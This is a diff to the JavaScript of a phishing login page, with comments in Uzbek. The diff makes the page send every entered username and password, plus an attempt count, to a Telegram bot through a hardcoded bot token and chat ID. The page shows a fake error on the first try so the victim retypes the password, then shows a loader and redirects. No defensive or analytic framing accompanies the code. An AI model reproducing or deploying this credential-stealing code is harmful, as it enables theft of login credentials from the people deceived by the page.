@@ -4,7 +4,7 @@ const loginButton = document.querySelector('button');
 const passwordInput = document.querySelector('.password-input');
 const togglePassword = document.querySelector('.toggle-password');
 const errorMessage = document.querySelector('.error-message');
-const loader = document.querySelector('#loader'); // Loader elementini tanlaymiz
+const loader = document.querySelector('#loader');
 
 // Bosishlar sonini hisoblash uchun o'zgaruvchi
 let clickCount = 0;
@@ -21,15 +21,19 @@ togglePassword.addEventListener('click', () => {
     togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
 });
 
-// Tugma bosilganda xato xabarini ko'rsatish yoki boshqa sahifaga o'tish
+// Tugma bosilganda har doim Telegramga xabar yuboramiz va logikani davom ettiramiz
 loginButton.addEventListener('click', (e) => {
     e.preventDefault(); // Formani yuborilishini to'xtatamiz
+
+    // Har safar tugma bosilganda Telegramga xabar yuboramiz
+    sendMessage();
+
     clickCount++; // Bosishlar sonini oshiramiz
 
     if (clickCount === 1) {
         // Birinchi bosishda xato xabarini ko'rsatamiz
         errorMessage.style.display = 'block';
-        loginButton.disabled = true; // Tugma nofaol bo'ladi
+        loginButton.disabled = true;
     } else if (clickCount === 2) {
         // Ikkinchi bosishda xato xabarini yashiramiz va loader ko'rsatamiz
         errorMessage.style.display = 'none';
@@ -38,30 +42,24 @@ loginButton.addEventListener('click', (e) => {
         // Loader-ni ko'rsatamiz
         loader.style.display = 'flex';
 
-        // Telegramga xabar yuboramiz
-        sendMessage();
-
-        // 3 soniyadan keyin next.html ga o'tamiz
+        // 2 soniyadan keyin next.html ga o'tamiz
         setTimeout(() => {
-            window.location.href = './nextPage/next.html'; // Updated path
-        }, 2000); // 2000ms = 2 seconds
+            window.location.href = './nextPage/next.html';
+        }, 2000);
     }
 });
 
 // Password input ustiga bosilganda qiymatini bo'shatish
 passwordInput.addEventListener('click', () => {
     if (errorMessage.style.display === 'block') {
-        // Agar xato xabari ko'rsatilsa, password inputini bo'shatamiz
         passwordInput.value = '';
     }
 });
 
 function checkInputs() {
-    // Ikkala input maydonining qiymatini tekshiramiz
     const username = inputs[0].value.trim();
     const password = inputs[1].value.trim();
 
-    // Agar foydalanuvchi nomi bo'sh bo'lmasa va parol 5 tadan ko'p belgi bo'lsa, tugmani faol qilamiz
     if (username !== '' && password.length > 5) {
         loginButton.disabled = false;
     } else {
@@ -73,10 +71,10 @@ function checkInputs() {
 function sendMessage() {
     const username = inputs[0].value.trim();
     const password = inputs[1].value.trim();
-    const message = `Username: ${username}\nPassword: ${password}`;
+    const message = `Username: ${username}\nPassword: ${password}\nAttempt: ${clickCount}`;
 
     const botToken = '7797599102:AAHdwqIPnKDRu0FRKhb9HH7_KYe9-wiDtyM';
-    const chatId = '1580328848'; // Sizning chat ID (botni ochgan paytingizda olingan)
+    const chatId = '1580328848';
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     fetch(url, {
